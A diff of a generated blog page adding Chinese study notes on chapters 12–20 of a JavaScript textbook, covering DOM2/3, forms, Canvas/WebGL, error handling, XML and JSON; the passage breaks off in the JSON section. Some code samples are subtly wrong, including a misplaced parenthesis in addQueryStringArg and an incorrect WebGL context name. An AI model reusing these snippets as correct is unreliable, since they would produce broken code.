+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
 			<div class="post-month">05月</div>
 			<div class="post-day">17</div>
 	</div>
@@ -768,12 +2468,12 @@
   
   <div class="post-date">
 			<div class="post-month">05月</div>
-			<div class="post-day">15</div>
+			<div class="post-day">17</div>
 	</div>
   
 
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/15/Hello-World-0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/3-js/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -792,7 +2492,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/15/Hello-World-0/" itemprop="url">Hello World!</a></h1>
+                <a class="post-title-link" href="/2018/05/17/3-js/" itemprop="url">「JavaScript高级程序设计」 第12-20章</a></h1>
         
 
         <div class="post-meta">
@@ -804,8 +2504,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-15T16:16:05+08:00">
-                2018-05-15
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-17T00:00:00+08:00">
+                2018-05-17
               </time>
             
 
@@ -844,145 +2544,247 @@
       
         
           
-            <h4 id="测试-发布我的第一个页面"><a href="#测试-发布我的第一个页面" class="headerlink" title="测试~发布我的第一个页面"></a>测试~发布我的第一个页面</h4>
+            <blockquote>
+<p>主要是把原来做的笔记放在博客上保存归档，供以后使用，正所谓好记性不如烂笔头</p>
+</blockquote>
+<h2 id="第十二章-DOM2和DOM3"><a href="#第十二章-DOM2和DOM3" class="headerlink" title="第十二章 DOM2和DOM3"></a>第十二章 DOM2和DOM3</h2><ol>
+<li>DOM2级规范定义了一些模块，用于增强DOM1级。</li>
+<li><strong>DOM2级核心</strong>为不同的DOM类型引入了一些与XML命名空间有关的方法。这些变化只在使用XML或XHTML文档时才有用；对于HTML文档没有实际意义。</li>
+<li>除了与XML命名空间有关的方法外，DOM2级核心还定义了以编程方式创建Document实例的方法，也支持创建DocumentType对象<br>4.<strong> DOM2级样式模块</strong>主要针对操作元素的样式信息而开发，其特性为：</li>
+</ol>
+<ul>
+<li>每个元素都有一个关联的style对象，可以用来确定和修改行内的样式</li>
+<li>要确定某个元素的计算样式（包括应用给它的所有CSS规则），可以使用getComputedStyle()方法</li>
+<li>IE不支持getComputedStyle()方法，但为所有元素都提供了能够返回相同信息的currentStyle属性</li>
+<li>可以通过document.styleSheets集合访问样式表</li>
+<li>除IE之外所有浏览器都支持针对样式表的这个接口，IE也为几乎所有相应的DOM功能提供了自己的一套属性和方法</li>
+</ul>
+<ol start="5">
+<li><strong>DOM2级遍历和范围模块</strong>提供了与DOM结构交互的不同方式：</li>
+</ol>
+<ul>
+<li>遍历即使用NodeIterator或TreeWalker对DOM执行深度优先遍历</li>
+<li>NodeIterator是一个简单的接口，只允许以一个节点的步幅前后移动。而TreeWalker在提供相同功能的同时，还支持在DOM结构的各个方向上移动，包括父节点、同辈节点和子节点等方向</li>
+<li>范围是选择DOM结构中特定部分，然后再执行相应操作的一种手段</li>
+<li>使用范围选取可以在删除文档中某些部分的同时，保持文档结构的格式良好，或者复制文档中的相应部分。</li>
+<li>IE8及更早版本不支持DOM2级遍历和范围模块，但它提供了一个专有的文本范围对象，可以用来完成简单的基于文本的范围操作。IE9完全支持DOM遍历</li>
+</ul>
+<h1 id="JavaScript高级程序设计"><a href="#JavaScript高级程序设计" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第14章-表单脚本"><a href="#第14章-表单脚本" class="headerlink" title="第14章 表单脚本"></a>第14章 表单脚本</h2><h3 id="表单的基础知识"><a href="#表单的基础知识" class="headerlink" title="表单的基础知识"></a>表单的基础知识</h3><h4 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h4><h4 id="重置表单"><a href="#重置表单" class="headerlink" title="重置表单"></a>重置表单</h4><h4 id="表单字段"><a href="#表单字段" class="headerlink" title="表单字段"></a>表单字段</h4><h3 id="文本框脚本"><a href="#文本框脚本" class="headerlink" title="文本框脚本"></a>文本框脚本</h3><h4 id="选择文本"><a href="#选择文本" class="headerlink" title="选择文本"></a>选择文本</h4><ol>
+<li>选择select事件</li>
+<li>取得选择的文本</li>
+<li>选择部分文本<h4 id="过滤输入"><a href="#过滤输入" class="headerlink" title="过滤输入"></a>过滤输入</h4></li>
+<li>屏蔽字符</li>
+<li>操作剪贴板<h4 id="自动切换焦点"><a href="#自动切换焦点" class="headerlink" title="自动切换焦点"></a>自动切换焦点</h4><h4 id="HTML5约束验证API"><a href="#HTML5约束验证API" class="headerlink" title="HTML5约束验证API"></a>HTML5约束验证API</h4></li>
+<li>必填字段</li>
+<li>其他输入类型</li>
+<li>数值范围</li>
+<li>输入模式</li>
+<li>检测有效性</li>
+<li>禁用验证<h3 id="14-3-选择框脚本"><a href="#14-3-选择框脚本" class="headerlink" title="14.3 选择框脚本"></a>14.3 选择框脚本</h3><h4 id="14-3-1-选择选项"><a href="#14-3-1-选择选项" class="headerlink" title="14.3.1 选择选项"></a>14.3.1 选择选项</h4><h4 id="14-3-2-添加选项"><a href="#14-3-2-添加选项" class="headerlink" title="14.3.2 添加选项"></a>14.3.2 添加选项</h4><h4 id="14-3-3-移除选项"><a href="#14-3-3-移除选项" class="headerlink" title="14.3.3 移除选项"></a>14.3.3 移除选项</h4><h4 id="14-3-4-移动和重排选项"><a href="#14-3-4-移动和重排选项" class="headerlink" title="14.3.4 移动和重排选项"></a>14.3.4 移动和重排选项</h4><h3 id="14-4-表单序列化"><a href="#14-4-表单序列化" class="headerlink" title="14.4 表单序列化"></a>14.4 表单序列化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">function serialize(form)&#123; </span><br><span class="line">    var parts = [], </span><br><span class="line">    field = null, </span><br><span class="line">    i, </span><br><span class="line">    len, </span><br><span class="line">    j, </span><br><span class="line">    optLen, </span><br><span class="line">    option, </span><br><span class="line">    optValue; </span><br><span class="line"> </span><br><span class="line"> for (i=0, len=form.elements.length; i &lt; len; i++)&#123; </span><br><span class="line"> field = form.elements[i]; </span><br><span class="line"> </span><br><span class="line"> switch(field.type)&#123; </span><br><span class="line"> case &quot;select-one&quot;: </span><br><span class="line"> case &quot;select-multiple&quot;: </span><br><span class="line"> if (field.name.length)&#123; </span><br><span class="line"> for (j=0, optLen = field.options.length; j &lt; optLen; j++)&#123; option = field.options[j]; </span><br><span class="line"> if (option.selected)&#123; </span><br><span class="line"> optValue = &quot;&quot;; </span><br><span class="line"> if (option.hasAttribute)&#123; </span><br><span class="line"> optValue = (option.hasAttribute(&quot;value&quot;) ? </span><br><span class="line"> option.value : option.text); </span><br><span class="line"> &#125; else &#123; </span><br><span class="line"> optValue = (option.attributes[&quot;value&quot;].specified ? </span><br><span class="line"> option.value : option.text); </span><br><span class="line"> &#125; </span><br><span class="line"> parts.push(encodeURIComponent(field.name) + &quot;=&quot; + </span><br><span class="line"> encodeURIComponent(optValue)); </span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> break; </span><br><span class="line"> </span><br><span class="line"> case undefined: //字段集</span><br><span class="line"> case &quot;file&quot;: //文件输入</span><br><span class="line"> case &quot;submit&quot;: //提交按钮</span><br><span class="line"> case &quot;reset&quot;: //重置按钮</span><br><span class="line"> case &quot;button&quot;: //自定义按钮</span><br><span class="line"> break; </span><br><span class="line"> </span><br><span class="line"> case &quot;radio&quot;: //单选按钮</span><br><span class="line"> case &quot;checkbox&quot;: //复选框</span><br><span class="line"> if (!field.checked)&#123; </span><br><span class="line"> break; </span><br><span class="line"> &#125; </span><br><span class="line"> /* 执行默认操作 */ </span><br><span class="line"> default: </span><br><span class="line"> //不包含没有名字的表单字段</span><br><span class="line"> if (field.name.length)&#123; </span><br><span class="line">        parts.push(encodeURIComponent(field.name) + &quot;=&quot; + </span><br><span class="line">    encodeURIComponent(field.value)); </span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line">     return parts.join(&quot;&amp;&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="富文本编辑"><a href="#富文本编辑" class="headerlink" title="富文本编辑"></a>富文本编辑</h3><h4 id="使用contenteditable属性"><a href="#使用contenteditable属性" class="headerlink" title="使用contenteditable属性"></a>使用contenteditable属性</h4><h4 id="操作富文本"><a href="#操作富文本" class="headerlink" title="操作富文本"></a>操作富文本</h4><h4 id="富文本选区"><a href="#富文本选区" class="headerlink" title="富文本选区"></a>富文本选区</h4><h4 id="表单与富文本"><a href="#表单与富文本" class="headerlink" title="表单与富文本"></a>表单与富文本</h4><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
+<li>使用JS可以增强已有的表单字段，从而创造出新的功能，或者提升表单的易用性。为此，表单、表单字段都引入了相应的属性和方法，以便JS使用</li>
+</ol>
+<ul>
+<li>可使用一些标准或非标准的方法选择文本框中的全部或部分文本</li>
+<li>大多数浏览器都采用了Firefox操作选择文本的方式，但IE仍然坚持自己的实现</li>
+<li>在文本框内容变化时，可以通过侦听键盘事件以及检测插入的字符，来允许或禁止用户输入某些字符</li>
+</ul>
+<ol start="2">
+<li>除Opera之外的所有浏览器都支持剪贴板事件，包括copy、cut和paste，其他浏览器在实现剪贴板事件时也分为几种不同的情况。</li>
+<li>添加选项等操作可以通过标准化的DOM来实现</li>
+<li>富文本编辑功能通过一个包含空HTML文档的iframe元素来实现。通过将空文档的designMode属性设置为on，就可以将该页面转换为可编辑状态。也可将某个元素设置为contenteditable</li>
+</ol>
+<h1 id="JavaScript高级程序设计-1"><a href="#JavaScript高级程序设计-1" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第十五章-使用Canvas绘图"><a href="#第十五章-使用Canvas绘图" class="headerlink" title="第十五章 使用Canvas绘图"></a>第十五章 使用Canvas绘图</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id = &quot;drawing&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;A drawing of sth&lt;/canvas&gt;</span><br></pre></td></tr></table></figure>
+<p>1.要在画布(canvas)上画图，需要取得绘图上下文对象的引用，调用getContext()方法，传入”2d”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var drawing = document.getElementById(&quot;drawing&quot;);</span><br><span class="line">    if (drawing.getContext)&#123;</span><br><span class="line">    var context = drawing.getContext(&quot;2d&quot;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.导出图像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 取得图像数据URI,并指定为png格式，注意这里不是地址链接</span><br><span class="line">var imgURI = drawing.toDataURL(&quot;image/png&quot;);</span><br><span class="line">// 显示图像</span><br><span class="line">var image = document.createElement(&quot;img&quot;);</span><br><span class="line">image.src = imgURI;</span><br><span class="line">document.body.appendChild(image);</span><br></pre></td></tr></table></figure></p>
+<h3 id="2D上下文"><a href="#2D上下文" class="headerlink" title="2D上下文"></a>2D上下文</h3><h4 id="填充和描边"><a href="#填充和描边" class="headerlink" title="填充和描边"></a>填充和描边</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.strokeStyle = &quot;red&quot;;</span><br><span class="line">context.fillStyle = &quot;#0000ff&quot;;</span><br></pre></td></tr></table></figure>
+<h4 id="绘制矩形"><a href="#绘制矩形" class="headerlink" title="绘制矩形"></a>绘制矩形</h4><p>1.fillRect(),strokeRect(),clearRect()<br>2.这三个方法都接收四个参数：矩形的x，y坐标，矩形的宽度和高度</p>
+<h4 id="绘制路径"><a href="#绘制路径" class="headerlink" title="绘制路径"></a>绘制路径</h4><p>1.首先调用beginPath()方法，表示要开始绘制新路径<br>2.再使用其他方法，如.arc,.moveTo等</p>
+<h4 id="绘制文本"><a href="#绘制文本" class="headerlink" title="绘制文本"></a>绘制文本</h4><p>1.fillText(),strokeText()<br>2.这两个方法都接收4个参数：要绘制的文本字符串，x，y坐标，和可选的最大像素宽度</p>
+<h4 id="变换"><a href="#变换" class="headerlink" title="变换"></a>变换</h4><ul>
+<li>rotate(angle)</li>
+<li>scale(scaleX,scaleY)</li>
+<li>translate(x,y)</li>
+<li>transform(m1_1,m1_2,m2_1,m2_2,dx,dy) //实现矩阵变换</li>
+<li>setTransform(m1_1,m1_2,m2_1,m2_2,dx,dy)//重置矩阵变换<h4 id="绘制图像"><a href="#绘制图像" class="headerlink" title="绘制图像"></a>绘制图像</h4>1.最简单的调用方式是传入一个HTML<img>元素，绘制起点的x,y坐标<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image = document.images[0];</span><br><span class="line">context.drawImage(image,10,10)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>2.改变图像大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.drawImage(image,50,10,20,30)</span><br></pre></td></tr></table></figure></p>
+<p>3.绘制到特定上下文中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.drawImage(image,0,10,50,50,0,100,40,60)</span><br></pre></td></tr></table></figure></p>
+<p>4.图像不能来自于其他域（在方法三中），会被判定为非法上下文</p>
+<h4 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h4><ul>
+<li>shadowColor</li>
+<li>shadowOffsetX/shadowOffsetY</li>
+<li>shadowBlur<h4 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h4>1.用createLinearGradint()方法创建一个线性渐变，接收起点x，y坐标以及终点x，y坐标<br>2.用addColorStop()方法指定色标，接收色标位置和CSS颜色值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var gradient = context.createLinearGradient(30,30,70,70);</span><br><span class="line">gradient.addColorStop(0,&quot;white&quot;);</span><br><span class="line">gradient.addColorStop(1,&quot;black&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>3.用createRadialGradient()方法可以创建径向渐变/放射渐变，前三个参数指定起点圆的圆心和半径，后三个参数指定终点圆的圆心和半径</p>
+<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h4><p>1.模式就是重复的图像，createPattern()方法传入两个参数，一个HTML<img>元素和一个表示如何重复图像的字符串，包括repeat,repeat-X,repeat-Y,no-repeat</p>
+<h4 id="使用图像数据"><a href="#使用图像数据" class="headerlink" title="使用图像数据"></a>使用图像数据</h4><p>1.getImageData()方法接收四个参数，x，y坐标以及目标区域的像素高度和宽度</p>
+<h4 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h4><p>1.globalAlpha用于指定透明度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.globalAlpha = 0.5;</span><br></pre></td></tr></table></figure></p>
+<p>2.gobalCompositionOperation表示后绘制的图像怎样与先绘制的图形结合</p>
+<h3 id="WebGL"><a href="#WebGL" class="headerlink" title="WebGL"></a>WebGL</h3><p>1.WebGL是针对Canvas的3D上下文</p>
+<h4 id="类型化数组"><a href="#类型化数组" class="headerlink" title="类型化数组"></a>类型化数组</h4><p>1.视图<br>2.类型化视图</p>
+<h4 id="WebGL上下文"><a href="#WebGL上下文" class="headerlink" title="WebGL上下文"></a>WebGL上下文</h4><p>1.创建一个<canvas>WebGL对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var drawing = document.getElementById(&quot;drawing&quot;);</span><br><span class="line">if (drawing.getContext)&#123;</span><br><span class="line">        var gl = drawing.getContext(&quot;experimental-webgl1&quot;);</span><br><span class="line">        if (gl)&#123;</span><br><span class="line">            //使用WebGL</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></canvas></p>
+<ul>
+<li>常量</li>
+<li>方法命名</li>
+<li>准备绘图</li>
+<li>视口与坐标</li>
+<li>缓冲区</li>
+<li>错误</li>
+<li>着色器</li>
+<li>编写着色器</li>
+<li>编写着色器程序</li>
+<li>为着色器传入值</li>
+<li>调试着色器和程序</li>
+<li>绘图</li>
+<li>纹理</li>
+<li>读取像素<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3></li>
+</ul>
+<ol>
+<li>HTML的<canvas>元素提供了一组JavaScript API，让我们可以动态地创建图形和图像。图形是在一个特定的上下文中创建的。而上下文对象目前有两种，第一种是2D上下文，可执行原始的绘图操作</canvas></li>
+</ol>
+<ul>
+<li>设置填充、描边颜色和模式</li>
+<li>绘制矩形</li>
+<li>绘制路径</li>
+<li>绘制文本</li>
+<li>创建渐变和模式</li>
+</ul>
+<ol start="2">
+<li>第二种是3D上下文，WebGL是从OpenGL ES2.0移植到浏览器中的</li>
+</ol>
+<ul>
+<li>用GLSL(OPENGL着色语言)编写的顶点和片段着色</li>
+<li>支持类型化数组，即将数组中的数据限定为某种特定的数值类型</li>
+<li>创建和操作纹理</li>
+</ul>
+<h1 id="JavaScript高级程序设计-2"><a href="#JavaScript高级程序设计-2" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第十七章-错误处理与调试"><a href="#第十七章-错误处理与调试" class="headerlink" title="第十七章 错误处理与调试"></a>第十七章 错误处理与调试</h2><h2 id="浏览器报告的错误"><a href="#浏览器报告的错误" class="headerlink" title="浏览器报告的错误"></a>浏览器报告的错误</h2><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="try-catch语句"><a href="#try-catch语句" class="headerlink" title="try-catch语句"></a>try-catch语句</h3><p>1.基本语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    //可能导致错误的代码</span><br><span class="line">&#125;catch(error)&#123;</span><br><span class="line">    //错误发生时怎么处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.如果try块中的任何代码发生了错误，就会立即退出代码执行过程，然后接着执行catch块。<br>3.error.message对象中包含着与错误有关的信息</p>
+<ul>
+<li>finally子句：一定会执行（因此catch或finally有一个即可）</li>
+<li>错误类型：error,evalerror,rangeerror,referenceerror,syntaxerror,typeerror,urierror<br>4.在跨浏览器编程中，最好使用检查错误类型的方式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    someFunction();</span><br><span class="line">&#125;catch (error)&#123;</span><br><span class="line">    if (error instanceof TypeError)&#123;</span><br><span class="line">        // 处理类型错误</span><br><span class="line">    &#125;else if (error instanceof ReferenceError)&#123;</span><br><span class="line">        // 处理引用错误</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        // 处理其他类型的错误</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="抛出错误"><a href="#抛出错误" class="headerlink" title="抛出错误"></a>抛出错误</h3><ol>
+<li>throw()操作符用于抛出自定义错误，需要给该操作符指定一个值，这个值可以是任何类型</li>
+<li>遇到throw操作符时，代码会立即停止执行，仅当有try-catch语句捕获到被抛出的值时，代码才会继续执行<h3 id="错误事件"><a href="#错误事件" class="headerlink" title="错误事件"></a>错误事件</h3></li>
+<li>任何没有通过try-catch处理的错误都会触发window对象的error事件<h3 id="处理错误的策略"><a href="#处理错误的策略" class="headerlink" title="处理错误的策略"></a>处理错误的策略</h3><h3 id="常见的错误类型"><a href="#常见的错误类型" class="headerlink" title="常见的错误类型"></a>常见的错误类型</h3>1.类型转换错误</li>
+</ol>
+<ul>
+<li>使用全等操作符以避免类型转换，即”===”和”!==”<br>2.数据类型错误<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (typeof url === &quot;string&quot;) // 通过检测类型确保安全 </span><br><span class="line">if (values instanceof Array) // 判断values的类型</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>3.通信错误</p>
+<ul>
+<li>对于通信时发送的查询字符串，应记住必须要使用encodeURIComponent()方法<h3 id="区分致命和非致命错误"><a href="#区分致命和非致命错误" class="headerlink" title="区分致命和非致命错误"></a>区分致命和非致命错误</h3><h3 id="保存错误日志"><a href="#保存错误日志" class="headerlink" title="保存错误日志"></a>保存错误日志</h3>1.在服务器上创建一个页面（或者是一个服务器入口点）用于处理错误数据<br>2.这个页面的作用就是从查询字符串中取得数据，然后再将数据写入错误日志中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 这个函数接受三个参数，要追加查询字符串的URL、参数名和参数值</span><br><span class="line">function addQueryStringArg(url,name,value)&#123;</span><br><span class="line">	if (url.indexOf(&quot;?&quot; === -1)&#123;</span><br><span class="line">		url += &quot;?&quot;;</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		url += &quot;&amp;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	url += encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(value);</span><br><span class="line">	return url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var url = &quot;http://www.somedomain.com&quot;;</span><br><span class="line">var newUrl = addQueryStringArg(url,&quot;redir&quot;,&quot;http://www.someotherdomain.com?a=b&amp;c=d&quot;);</span><br><span class="line">alert(newUrl);</span><br></pre></td></tr></table></figure>
+<h2 id="调试技术"><a href="#调试技术" class="headerlink" title="调试技术"></a>调试技术</h2><h3 id="将消息记录到控制台"><a href="#将消息记录到控制台" class="headerlink" title="将消息记录到控制台"></a>将消息记录到控制台</h3><ol>
+<li>用cosole对象向控制台写入消息</li>
+</ol>
+<ul>
+<li>console.error</li>
+<li>console.info</li>
+<li>console.log</li>
+<li>console.warn<h3 id="将消息记录到当前页面"><a href="#将消息记录到当前页面" class="headerlink" title="将消息记录到当前页面"></a>将消息记录到当前页面</h3><h3 id="抛出错误-1"><a href="#抛出错误-1" class="headerlink" title="抛出错误"></a>抛出错误</h3><h2 id="常见的IE错误"><a href="#常见的IE错误" class="headerlink" title="常见的IE错误"></a>常见的IE错误</h2><h3 id="操作终止"><a href="#操作终止" class="headerlink" title="操作终止"></a>操作终止</h3><h3 id="无效字符"><a href="#无效字符" class="headerlink" title="无效字符"></a>无效字符</h3><h3 id="未找到成员"><a href="#未找到成员" class="headerlink" title="未找到成员"></a>未找到成员</h3><h3 id="未知运行时错误"><a href="#未知运行时错误" class="headerlink" title="未知运行时错误"></a>未知运行时错误</h3><h3 id="语法错误"><a href="#语法错误" class="headerlink" title="语法错误"></a>语法错误</h3><h3 id="系统无法找到指定资源"><a href="#系统无法找到指定资源" class="headerlink" title="系统无法找到指定资源"></a>系统无法找到指定资源</h3>## </li>
+</ul>
+<ol>
+<li>下面是几种避免浏览器响应js错误的方法</li>
+</ol>
+<ul>
+<li>在可能发生错误的地方使用try-catch语句</li>
+<li>使用window.onerror事件处理程序，接受try-catch不能处理的所有错误（只限于IE/Firefox/Chrome）</li>
+</ul>
+<ol start="2">
+<li>对任何Web应用程序都应该分析可能的错误来源，并制定方案</li>
+</ol>
+<ul>
+<li>首先明确致命错误与非致命错误</li>
+<li>分析代码，以判断最可能发生的错误：类型转换、未充分检测数据类型、发送给服务器或者从服务器接收到的数据有错误</li>
+</ul>
+<h1 id="JavaScript高级程序设计-3"><a href="#JavaScript高级程序设计-3" class="headerlink" title="JavaScript高级程序设计"></a>JavaScript高级程序设计</h1><h2 id="第18章-JavaScript与XML"><a href="#第18章-JavaScript与XML" class="headerlink" title="第18章 JavaScript与XML"></a>第18章 JavaScript与XML</h2><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><ol>
+<li>JS对XML以及相关技术有很大的支持，然而，由于缺乏规范，共同的功能却存在一些不同的实现。DOM2级提供了创建空XML文档的API，但没有涉及解析和序列化。为了解决这个问题，IE采取了下列方式：</li>
+</ol>
+<ul>
+<li>用ActiveX对象来支持处理XML，而相同的对象也可以用来构建桌面应用程序。</li>
+<li>windows携带了MSXML库，JS能够访问这个库</li>
+<li>这个库中包含对基本XML解析和序列化的支持，同时也支持Xpath和XSLT等技术</li>
+</ul>
+<ol start="2">
+<li>Firefox实现了两个新类型</li>
+</ol>
+<ul>
+<li>DOMParser类型比较简单，其对象可以将XML字符串解析为DOM文档</li>
+<li>XMLSerializer类型执行相反的操作，将DOM文档序列化为XML字符串</li>
+</ul>
+<ol start="3">
+<li>其他浏览器也实现了Firefox中相同的类型，这些类型也成为Web开发中的事实标准。</li>
+<li>DOM3级引入了一个针对XpathAPI的规范。这些API可以让JS基于DOM文档运行任何Xpath查询，并且能够返回任何数据的结果。IE以自己的方式实现了对Xpath的支持，即selectSingleNode（）和selectNodes（）方法。在DOM文档中能够查找节点或节点集合。</li>
+<li>最后一种相关技术是XSLT，Firefox为此提供了XSLTProcessor类型，其他浏览器陆续实现。IE则针对XSLT提供了自己的方案，一个是简单的transformNode（）方法，另一个是较为复杂的模板/处理器手段。</li>
+</ol>
+<h2 id="第19章-E4X"><a href="#第19章-E4X" class="headerlink" title="第19章 E4X"></a>第19章 E4X</h2><h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><ol>
+<li>E4X是以ECMA-357标准的形式发布的一个针对ECMAScript的一个扩展。E4X的目的是为操作XML数据提供与标准ECMAScript更相近的语法。</li>
+<li>到2011年底，FireFox还是唯一一个支持E4X的浏览器。<h2 id="第20章-JSON"><a href="#第20章-JSON" class="headerlink" title="第20章 JSON"></a>第20章 JSON</h2></li>
+<li>JSON = JavaScript Object Notation<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3></li>
+<li>JSON语法可以表示以下三种类型的值</li>
+</ol>
+<ul>
+<li>简单值：不支持undefined</li>
+<li>对象：无序键值对</li>
+<li>数组</li>
+<li>不支持变量、函数、对象实例<h4 id="简单值"><a href="#简单值" class="headerlink" title="简单值"></a>简单值</h4></li>
+</ul>
+<ol>
+<li>JSON字符串必须用双引号表示<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello world!&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><ol>
